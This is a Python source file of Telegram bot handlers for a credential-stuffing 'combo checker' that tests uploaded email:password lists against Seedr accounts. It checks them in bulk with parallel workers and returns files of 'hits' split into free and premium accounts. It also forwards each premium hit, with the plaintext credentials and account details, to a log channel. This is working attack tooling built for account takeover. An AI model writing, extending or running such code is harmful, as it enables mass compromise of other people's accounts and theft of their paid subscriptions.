"""
Checker command handlers.
Handles single and bulk combo checking.
"""
import asyncio
import os
import time
from datetime import datetime
from typing import Dict, Any, List

from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from bot.services.database import db
from bot.services.checker import SeedrChecker, AccountInfo
from bot.utils.helpers import validate_combo, parse_combo_file, format_time, calculate_cpm
from bot.states import CheckStates
from bot.config import config
from bot.keyboards.inline import get_cancel_keyboard
from structlog import get_logger
from bot.utils.logging import log_file_check_start, log_file_check_finish, log_user_error, log_admin_command, log_user_action

logger = get_logger(__name__)
router = Router()

# Store active tasks
active_tasks: Dict[str, Dict[str, Any]] = {}


@router.message(Command("chk"))
async def cmd_single_check(message: Message):
    """Handle /chk command for single combo check."""
    user_id = message.from_user.id
    args = message.text.split(maxsplit=1)
    
    if len(args) != 2:
        await message.reply(
            "❌ *Invalid format*\n\n"
            "Usage: `/chk email:password`\n"
            "Example: `/chk user@example.com:mypassword`",
            parse_mode="Markdown"
        )
        return
    
    combo = args[1].strip()
    is_valid, email, password = validate_combo(combo)
    
    if not is_valid:
        await message.reply(
            "❌ *Invalid combo format*\n\n"
            "Format should be: `email:password`\n"
            "Example: `user@example.com:mypassword`",
            parse_mode="Markdown"
        )
        return
    
    # Send checking message
    status_msg = await message.reply(
        "🔍 *Checking combo...*",
        parse_mode="Markdown"
    )
    
    try:
        # Check the combo
        async with SeedrChecker() as checker:
            success, account_info, error = await checker.check_combo(email, password)
        
        # Format result
        if success and account_info:
            result_text = format_hit_result(combo, account_info)
            if account_info.is_premium and config.log_channel_id:
                try:
                    hit_text = (
                        f"👑 *PREMIUM HIT DETECTED (Single Check)*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"👤 *User ID:* `{user_id}`\n"
                        f"📧 *Combo:* `{combo}`\n\n"
                        f"📦 *Plan Name:* `{account_info.package_name}`\n"
                        f"📊 *Max Capacity:* `{account_info.space_max}`\n"
                        f"📈 *Used Space:* `{account_info.space_used}`\n"
                        f"📉 *Free Space:* `{account_info.space_free}`\n"
                        f"🌍 *Country:* `{account_info.country}`\n"
                        f"💳 *Billing:* `{account_info.billing_plan}`\n"
                        f"🔒 *Private IP:* `{account_info.private_ip}`\n"
                        f"📨 *Invites:* `{account_info.invites}`\n"
                        "━━━━━━━━━━━━━━━━━━━━━"
                    )
                    await message.bot.send_message(
                        config.log_channel_id,
                        hit_text,
                        parse_mode="Markdown"
                    )
                except Exception as log_err:
                    logger.error("log_channel_single_premium_hit_failed", error=str(log_err))
        else:
            result_text = format_dead_result(combo, error)
        
        await status_msg.edit_text(result_text, parse_mode="Markdown")
    except Exception as e:
        log_user_error(
            user_id=user_id,
            command=f"/chk {combo[:20]}...",
            error_msg=str(e),
            chat_id=message.chat.id,
            chat_title=message.chat.title or ""
        )
        await status_msg.edit_text(
            f"❌ *Error during check!*\n\n`{str(e)}`",
            parse_mode="Markdown"
        )


@router.message(Command("txt"))
async def cmd_bulk_check(message: Message, state: FSMContext):
    """Handle /txt command for bulk checking."""
    user_id = message.from_user.id
    
    # Check user role / privilege
    user_db_data = await db.get_user(user_id)
    role = user_db_data.get("role", "member") if user_db_data else "member"
    is_privileged = config.is_admin(user_id) or role in ["admin", "owner"]
    
    # Check if user has active task (privileged users bypass this limit)
    if not is_privileged and await db.get_user_active_task(user_id):
        await message.reply(
            "⚠️ *You already have a running task!*\n"
            "Use /cancel to stop it first.",
            parse_mode="Markdown"
        )
        return

    # Check if user is replying to a txt file or attached it directly
    doc = None
    if message.document:
        doc = message.document
    elif message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        
    if doc and doc.file_name.endswith('.txt'):
        await state.set_state(CheckStates.waiting_for_file)
        await handle_combo_file(message, state)
        return

    await message.reply(
        "📁 *Bulk Check Mode*\n\n"
        "Please send a `.txt` file with combos.\n"
        "Format: `email:password` (one per line)\n\n"
        "📌 *Group Note:* In groups, you must reply to this message with the file or add the `/txt` caption to the upload.\n\n"
        "📌 Limits:\n"
        f" • Max file size: {config.max_file_size_mb} MB\n"
        " • Max combos for members: 1000 lines",
        parse_mode="Markdown"
    )
    
    await state.set_state(CheckStates.waiting_for_file)


@router.message(CheckStates.waiting_for_file, F.document)
async def handle_combo_file(message: Message, state: FSMContext):
    """Handle uploaded combo file."""
    user_id = message.from_user.id
    
    # Check user role / privilege
    user_db_data = await db.get_user(user_id)
    role = user_db_data.get("role", "member") if user_db_data else "member"
    is_privileged = config.is_admin(user_id) or role in ["admin", "owner"]
    
    # Check if user has active task (privileged users bypass limit)
    if not is_privileged and await db.get_user_active_task(user_id):
        await message.reply(
            "⚠️ *You already have a running task!*\n"
            "Use /cancel to stop it first.",
            parse_mode="Markdown"
        )
        await state.clear()
        return

    # Check timeout/cooldown for member only
    if not is_privileged:
        last_completed_str = user_db_data.get("last_task_completed_at") if user_db_data else None
        if last_completed_str:
            try:
                last_completed = datetime.fromisoformat(last_completed_str)
                elapsed = (datetime.utcnow() - last_completed).total_seconds()
                cooldown = config.member_timeout
                if elapsed < cooldown:
                    remaining_cooldown = int(cooldown - elapsed)
                    await message.reply(
                        f"⏳ *Cooldown Active!*\n\n"
                        f"Members must wait `{remaining_cooldown}` seconds before running the next task.",
                        parse_mode="Markdown"
                    )
                    await state.clear()
                    return
            except Exception as e:
                logger.error("cooldown_check_error", error=str(e))
    
    document = message.document or (message.reply_to_message and message.reply_to_message.document)
    if not document:
        await state.clear()
        return
    chat_id = message.chat.id
    chat_title = message.chat.title or ""
    
    # Log user action (file upload)
    log_user_action(
        user_id=user_id,
        action=f"uploaded combo file: {document.file_name}",
        chat_id=chat_id,
        chat_title=chat_title
    )
    
    # Validate file type
    if not document.file_name.endswith('.txt'):
        log_user_error(user_id, "file upload", f"invalid file type: {document.file_name}", chat_id, chat_title)
        await message.reply(
            "❌ *Invalid file type!*\n"
            "Only `.txt` files are accepted.",
            parse_mode="Markdown"
        )
        await state.clear()
        return
        
    # Validate empty file
    if document.file_size == 0:
        log_user_error(user_id, "file upload", f"empty file: {document.file_name}", chat_id, chat_title)
        await message.reply(
            "❌ *Invalid file!*\n"
            "The uploaded file is empty.",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    # Validate file size
    file_size_mb = document.file_size / (1024 * 1024)
    if file_size_mb > config.max_file_size_mb:
        log_user_error(user_id, "file upload", f"oversized file: {file_size_mb:.2f} MB", chat_id, chat_title)
        await message.reply(
            f"❌ *File too large!*\n"
            f"Max size: {config.max_file_size_mb} MB\n"
            f"Your file: {file_size_mb:.2f} MB",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    # Log start of download
    log_user_action(user_id, f"started downloading combo file: {document.file_name}", chat_id, chat_title)
    
    # Download file
    status_msg = await message.reply("📥 *Downloading file...*", parse_mode="Markdown")
    
    file_path = f"temp_{user_id}_{document.file_name}"
    
    try:
        await message.bot.download(document, destination=file_path)
        log_user_action(user_id, f"finished downloading combo file: {document.file_name}", chat_id, chat_title)
        
        # Parse file
        await status_msg.edit_text("📄 *Parsing combos...*", parse_mode="Markdown")
        log_user_action(user_id, f"parsing combos from file: {document.file_name}", chat_id, chat_title)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        valid_combos, total_lines, invalid_lines, duplicates_removed = parse_combo_file(content)
        
        # Get user role for limit check
        user_db_data = await db.get_user(user_id)
        role = user_db_data.get("role", "member") if user_db_data else "member"
        is_privileged = config.is_admin(user_id) or role in ["admin", "owner"]
        
        # Enforce line limits for members
        if not is_privileged and len(valid_combos) > 1000:
            log_user_error(user_id, "file upload", f"exceeded member combo limit: {len(valid_combos)} lines", chat_id, chat_title)
            await message.reply(
                "⚠ *Maximum allowed:* 1000 lines.\n\n"
                "Please split your combo using:\n"
                "`/spt 500`\n"
                "or another preferred amount.",
                parse_mode="Markdown"
            )
            if os.path.exists(file_path):
                os.remove(file_path)
            await state.clear()
            return
            
        # Create task ID
        task_id = f"task_{user_id}_{int(time.time())}"
        
        # Log start of processing to console
        log_file_check_start(user_id, document.file_name, task_id, len(valid_combos), chat_id, chat_title)
        
        # Send start of task notification to the log channel
        if config.log_channel_id:
            try:
                task_start_text = (
                    f"🚀 *Task Started*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 *User:* {message.from_user.first_name} {message.from_user.last_name or ''}\n"
                    f"🆔 *ID:* `{user_id}`\n"
                    f"📝 *Username:* @{message.from_user.username or 'N/A'}\n"
                    f"📁 *File Name:* `{document.file_name}`\n"
                    f"📊 *Total Combos:* `{len(valid_combos)}`\n"
                    f"🔑 *Task ID:* `{task_id}`"
                )
                await message.bot.send_message(
                    config.log_channel_id,
                    task_start_text,
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error("log_channel_task_start_failed", error=str(e))
                
        # Show preview briefly then delete analysis message
        preview_text = (
            "📊 *↯ 〔 FILE ANALYSIS 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 Total Lines: `{total_lines}`\n"
            f"✅ Valid Combos: `{len(valid_combos)}`\n"
            f"❌ Invalid Format: `{invalid_lines}`\n"
            f"🔄 Duplicates Removed: `{duplicates_removed}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━"
        )
        await status_msg.edit_text(preview_text, parse_mode="Markdown")
        
        # Create task
        await db.create_task(user_id, task_id)
        
        # Store cancel event
        cancel_event = asyncio.Event()
        active_tasks[task_id] = {
            "user_id": user_id,
            "task_id": task_id,
            "cancel_event": cancel_event
        }
        
        # Delete analysis message and start fresh progress message
        await status_msg.delete()
        
        progress_msg = await message.reply(
            "⚡ *↯ 〔 STARTING CHECKER 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 Total: `{len(valid_combos)}` combos\n"
            "🚀 Initializing parallel engines...\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard(task_id)
        )
        
        await state.set_state(CheckStates.checking)
        
        # Determine concurrency based on role
        if config.is_owner(user_id) or role == "owner":
            concurrency = config.owner_workers
        elif config.is_admin(user_id) or role == "admin":
            concurrency = config.admin_workers
        else:
            concurrency = config.member_workers
            
        async def on_premium_hit(combo: str, account_info: AccountInfo):
            if config.log_channel_id:
                try:
                    hit_text = (
                        f"👑 *PREMIUM HIT DETECTED*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"👤 *User ID:* `{user_id}`\n"
                        f"📧 *Combo:* `{combo}`\n\n"
                        f"📦 *Plan Name:* `{account_info.package_name}`\n"
                        f"📊 *Max Capacity:* `{account_info.space_max}`\n"
                        f"📈 *Used Space:* `{account_info.space_used}`\n"
                        f"📉 *Free Space:* `{account_info.space_free}`\n"
                        f"🌍 *Country:* `{account_info.country}`\n"
                        f"💳 *Billing:* `{account_info.billing_plan}`\n"
                        f"🔒 *Private IP:* `{account_info.private_ip}`\n"
                        f"📨 *Invites:* `{account_info.invites}`\n"
                        "━━━━━━━━━━━━━━━━━━━━━"
                    )
                    await message.bot.send_message(
                        config.log_channel_id,
                        hit_text,
                        parse_mode="Markdown"
                    )
                except Exception as log_err:
                    logger.error("log_channel_premium_hit_failed", error=str(log_err))
                    
        # Run batch check
        async with SeedrChecker() as checker:
            results = await checker.check_batch(
                combos=valid_combos,
                progress_callback=lambda p, r, c: update_progress(progress_msg, p, r, c, task_id),
                cancel_event=cancel_event,
                concurrency=concurrency,
                on_premium_hit=on_premium_hit
            )
            
        # Update task in database
        await db.update_task(task_id, {
            "total_combos": results["total"],
            "processed": results["processed"],
            "hits": len(results["hits"]),
            "dead": results["dead"],
            "invalid": results["invalid"]
        })
        
        # Clear throttle entry
        last_update_times.pop(task_id, None)
        
        elapsed = results["end_time"] - results["start_time"]
        
        if results["cancelled"]:
            await db.cancel_task(task_id)
            cpm = calculate_cpm(results["processed"], elapsed)
            
            summary_text = (
                "❌ *↯ 〔 TASK CANCELLED 〕 ↯*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "📊 *Cancellation Statistics:*\n"
                f" ├ 📝 Total Combos: `{results['total']}`\n"
                f" ├ ✅ Checked before Stop: `{results['processed']}`\n"
                f" ├ 🎯 Hits Found: `{len(results['hits'])}`\n"
                f" ├ 🆓 Free: `{len(results.get('free', []))}`\n"
                f" ├ 👑 Premium: `{len(results.get('premium', []))}`\n"
                f" ├ ❌ Dead: `{results['dead']}`\n"
                f" └ ⚠ Invalid: `{results['invalid']}`\n\n"
                "⏱ *Performance:*\n"
                f" ├ 🕒 Time Elapsed: `{format_time(elapsed)}`\n"
                f" └ ⚡ Average Speed: `{cpm:.1f} CPM`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            await progress_msg.edit_text(summary_text, parse_mode="Markdown")
        else:
            await db.complete_task(task_id)
            cpm = calculate_cpm(results["processed"], elapsed)
            
            summary_text = (
                "✅ *↯ 〔 CHECK TASK COMPLETED 〕 ↯*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "📊 *Final Check Statistics:*\n"
                f" ├ 📝 Total Combos: `{results['total']}`\n"
                f" ├ ✅ Checked: `{results['processed']}`\n"
                f" ├ 🎯 Hits: `{len(results['hits'])}`\n"
                f" ├ 🆓 Free: `{len(results.get('free', []))}`\n"
                f" ├ 👑 Premium: `{len(results.get('premium', []))}`\n"
                f" ├ ❌ Dead: `{results['dead']}`\n"
                f" └ ⚠ Invalid: `{results['invalid']}`\n\n"
                "⏱ *Performance:*\n"
                f" ├ 🕒 Time Elapsed: `{format_time(elapsed)}`\n"
                f" └ ⚡ Average Speed: `{cpm:.1f} CPM`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            
            await progress_msg.edit_text(summary_text, parse_mode="Markdown")
            
        # Send hits file if any
        if results["hits"]:
            hits_file = f"hits_{user_id}_{int(time.time())}.txt"
            with open(hits_file, 'w', encoding='utf-8') as hf:
                for hit in results["hits"]:
                    hf.write(f"{hit['combo']}\n")
                    
            await message.reply_document(
                FSInputFile(hits_file),
                caption=f"🎯 *↯ 〔 HITS REPORT 〕 ↯*\n━━━━━━━━━━━━━━━━━━━━━\n\n🎯 Total Hits: `{len(results['hits'])}` verified accounts.\n\n━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
            
            if os.path.exists(hits_file):
                os.remove(hits_file)
                
        # Send free hits file if any
        if results.get("free"):
            free_file = f"free_{user_id}_{int(time.time())}.txt"
            with open(free_file, 'w', encoding='utf-8') as hf:
                for hit in results["free"]:
                    hf.write(f"{hit['combo']}\n")
                    
            await message.reply_document(
                FSInputFile(free_file),
                caption=f"🆓 *↯ 〔 FREE HITS REPORT 〕 ↯*\n━━━━━━━━━━━━━━━━━━━━━\n\n🆓 Total Free Hits: `{len(results['free'])}` accounts.\n\n━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
            
            if os.path.exists(free_file):
                os.remove(free_file)
                
        # Send premium hits file if any
        if results.get("premium"):
            premium_file = f"premium_{user_id}_{int(time.time())}.txt"
            with open(premium_file, 'w', encoding='utf-8') as hf:
                for hit in results["premium"]:
                    hf.write(f"{hit['combo']}\n")
                    
            await message.reply_document(
                FSInputFile(premium_file),
                caption=f"👑 *↯ 〔 PREMIUM HITS REPORT 〕 ↯*\n━━━━━━━━━━━━━━━━━━━━━\n\n👑 Total Premium Hits: `{len(results['premium'])}` premium accounts.\n\n━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
            
            if os.path.exists(premium_file):
                os.remove(premium_file)
                
        # Log success to console
        log_file_check_finish(
            user_id=user_id,
            task_id=task_id,
            hits=len(results["hits"]),
            processed=results["processed"],
            status="finished" if not results["cancelled"] else "cancelled",
            chat_id=chat_id,
            chat_title=chat_title
        )
        
        # Update user stats in DB
        user = await db.get_user(user_id)
        if user:
            await db.update_user_stats(user_id, {
                "total_checks": user.get("total_checks", 0) + results["processed"],
                "total_hits": user.get("total_hits", 0) + len(results["hits"]),
                "total_dead": user.get("total_dead", 0) + results["dead"],
                "total_invalid": user.get("total_invalid", 0) + results["invalid"]
            })
            
    except Exception as e:
        log_user_error(user_id, "bulk check file check", str(e), chat_id, chat_title)
        await message.reply(
            f"❌ *Error during check!*\n\n`{str(e)}`",
            parse_mode="Markdown"
        )
    finally:
        # Delete cancellation notice if exists
        task_data = active_tasks.get(task_id)
        if task_data and "cancel_msg" in task_data:
            try:
                await task_data["cancel_msg"].delete()
            except Exception:
                pass
        
        # Cleanup temp file
        if os.path.exists(file_path):
            os.remove(file_path)
        active_tasks.pop(task_id, None)
        await state.clear()


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    """Handle /cancel and /cancel <task_id> commands."""
    user_id = message.from_user.id
    chat_title = message.chat.title or ""
    chat_id = message.chat.id
    
    args = message.text.split()
    
    # If there are arguments (e.g. /cancel task_123456_789)
    if len(args) > 1:
        target_task_id = args[1].strip()
        
        # Find the task
        task_info = active_tasks.get(target_task_id)
        if task_info:
            target_user_id = task_info.get("user_id")
            # Check if user is owner or it is their own task
            if not config.is_owner(user_id) and target_user_id != user_id:
                await message.reply(
                    "❌ *Permission Denied*\n"
                    "You can only cancel your own tasks.",
                    parse_mode="Markdown"
                )
                return
                
            task_info["cancel_event"].set()
            log_user_action(user_id, f"cancelled task {target_task_id} via command", chat_id, chat_title)
            
            # Notify command issuer
            await message.reply(
                f"✅ *Task Cancelled Successfully*\n"
                f"Task `{target_task_id}` has been cancelled.",
                parse_mode="Markdown"
            )
            
            # Notify user (if different)
            if target_user_id != user_id:
                try:
                    await message.bot.send_message(
                        target_user_id,
                        "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
                        "━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "⏹ *Your task has been cancelled by the Owner.*\n"
                        "Collected hits will be returned shortly.\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
        else:
            await message.reply(
                f"❌ *Error: Task not found*\n"
                f"No active task with ID `{target_task_id}` was found.",
                parse_mode="Markdown"
            )
        return
        
    # Normal user cancel - find any active task for this user
    user_active_tasks = [t for t in active_tasks.values() if t.get("user_id") == user_id]
    if user_active_tasks:
        # Cancel the latest one
        task_to_cancel = user_active_tasks[-1]
        task_to_cancel["cancel_event"].set()
        log_user_action(user_id, f"requested task cancellation for {task_to_cancel['task_id']} via command", chat_id, chat_title)
        cancel_msg = await message.reply(
            "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⏹ *Cancelling current task...*\n"
            "Collected hits will be returned shortly.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        task_to_cancel["cancel_msg"] = cancel_msg
    else:
        await message.reply(
            "ℹ *↯ 〔 INFO 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "ℹ *No active checking task found to cancel.*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )


@router.callback_query(F.data.startswith("cancel_task"))
async def callback_cancel(callback: CallbackQuery, state: FSMContext):
    """Handle cancel callback."""
    user_id = callback.from_user.id
    chat_title = callback.message.chat.title or ""
    chat_id = callback.message.chat.id
    
    # Parse task_id if present (e.g. cancel_task:task_id)
    data_parts = callback.data.split(":", 1)
    target_task_id = data_parts[1] if len(data_parts) > 1 else None
    
    task_to_cancel = None
    if target_task_id:
        task_to_cancel = active_tasks.get(target_task_id)
    else:
        # Find any active task for this user
        user_active_tasks = [t for t in active_tasks.values() if t.get("user_id") == user_id]
        if user_active_tasks:
            task_to_cancel = user_active_tasks[-1]
            
    if task_to_cancel:
        task_to_cancel["cancel_event"].set()
        log_user_action(user_id, f"requested task cancellation for {task_to_cancel['task_id']} via inline button", chat_id, chat_title)
        cancel_msg = await callback.message.reply(
            "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⏹ *Cancelling current task...*\n"
            "Collected hits will be returned shortly.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        task_to_cancel["cancel_msg"] = cancel_msg
        await callback.answer("Cancellation request sent")
    else:
        await callback.message.reply(
            "ℹ *↯ 〔 INFO 〕 ↯*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "ℹ *No active checking task found to cancel.*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        await callback.answer("No active task found")


# Global throttle dictionary
last_update_times = {}


async def update_progress(
    message: Message,
    processed: int,
    results: Dict[str, Any],
    current_combo: str,
    task_id: str
):
    """Update progress message with throttling based on config."""
    now = time.time()
    last_update = last_update_times.get(task_id, 0)
    
    # Extract sub-list lengths
    free_cnt = len(results.get("free", []))
    premium_cnt = len(results.get("premium", []))
    hits_cnt = len(results["hits"])
    dead_cnt = results["dead"]
    
    # Throttle edits to at most once every STATUS_UPDATE_INTERVAL seconds (always update last step)
    is_last = processed >= results["total"]
    if not is_last and (now - last_update) < config.status_update_interval:
        # Still update task in db
        try:
            await db.update_task(task_id, {
                "processed": processed,
                "hits": hits_cnt,
                "dead": dead_cnt,
                "current_combo": current_combo
            })
        except Exception:
            pass
        return
        
    last_update_times[task_id] = now
    elapsed = now - results["start_time"]
    cpm = calculate_cpm(processed, elapsed)
    remaining = results["total"] - processed
    estimated_remaining = (remaining / cpm) * 60 if cpm > 0 else 0
    
    # Progress Bar
    total_bar = 10
    filled = int(round((processed / results["total"]) * total_bar)) if results["total"] > 0 else 0
    bar = "▰" * filled + "▱" * (total_bar - filled)
    
    progress_text = (
        "*COMBO CHECKING IN PROGRESS*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Current Combo:\n"
        f"`{current_combo[:50]}`\n\n"
        f"📊 Checking Status: `{bar}`\n"
        f" ├ Processed: `{processed} / {results['total']}`\n"
        f" ├ Hits: `{hits_cnt}`\n"
        f" ├ Free: `{free_cnt}`\n"
        f" ├ Premium: `{premium_cnt}`\n"
        f" └ Dead: `{dead_cnt}`\n\n"
        f"⏱️ Time Metrics:\n"
        f" ├ Elapsed: `{format_time(elapsed)}`\n"
        f" ├ Remaining: `{format_time(estimated_remaining)}`\n"
        f" └ Speed: `{cpm:.1f} CPM`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Press button below to cancel task."
    )
    
    try:
        await message.edit_text(
            progress_text,
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard(task_id)
        )
    except Exception:
        pass  # Ignore Telegram editing errors
        
    # Update task in DB
    try:
        await db.update_task(task_id, {
            "processed": processed,
            "hits": hits_cnt,
            "dead": dead_cnt,
            "current_combo": current_combo
        })
    except Exception:
        pass


def format_hit_result(combo: str, account: AccountInfo) -> str:
    """Format hit result message."""
    return (
        "✅ *↯ 〔 CHECK RESULT: HIT 〕 ↯*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📧 *Account Combo:*\n"
        f"`{combo}`\n\n"
        "👑 *Subscription Details:*\n"
        f" ├ 🌟 Premium: `{'Yes' if account.is_premium else 'No'}`\n"
        f" ├ 📦 Plan Name: `{account.package_name}`\n"
        f" └ 💳 Billing: `{account.billing_plan}`\n\n"
        "💾 *Storage & Usage:*\n"
        f" ├ 📊 Max Capacity: `{account.space_max}`\n"
        f" ├ 📈 Used Space: `{account.space_used}`\n"
        f" └ 📉 Free Space: `{account.space_free}`\n\n"
        "👤 *Account Metadata:*\n"
        f" ├ 🌍 Country: `{account.country}`\n"
        f" ├ 📨 Invites Available: `{account.invites}`\n"
        f" └ 🔒 Private IP: `{account.private_ip}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )


def format_dead_result(combo: str, error: str) -> str:
    """Format dead result message."""
    return (
        "❌ *↯ 〔 CHECK RESULT: DEAD 〕 ↯*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📧 *Account Combo:*\n"
        f"`{combo}`\n\n"
        f"⚠ *Failure Reason:* `{error}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )